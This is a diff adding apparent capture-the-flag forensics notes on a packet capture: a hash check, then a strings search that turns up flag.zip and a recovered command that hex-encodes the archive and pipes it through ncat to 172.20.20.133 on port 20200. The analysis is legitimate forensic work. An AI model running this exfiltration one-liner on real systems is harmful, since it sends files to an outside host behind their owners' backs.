@@ -1,0 +1,10 @@
+20ac157ee412240ee0f944effd41f870d093b005bb7168c0e629a193c8d0febe
+$ cat cap.pcap | sha256sum
+20ac157ee412240ee0f944effd41f870d093b005bb7168c0e629a193c8d0febe  -
+======================================================================
+$ strings cap.pcap | grep -i flag
+flag.zip
+Ffile Documents/flag.zip
+Documents/flag.zip: Zip archive data, at least v2.0 to extract
+xxd -p Documents/flag.zip | tr -d '\n' | ncat 172.20.20.133 20200
+======================================================================
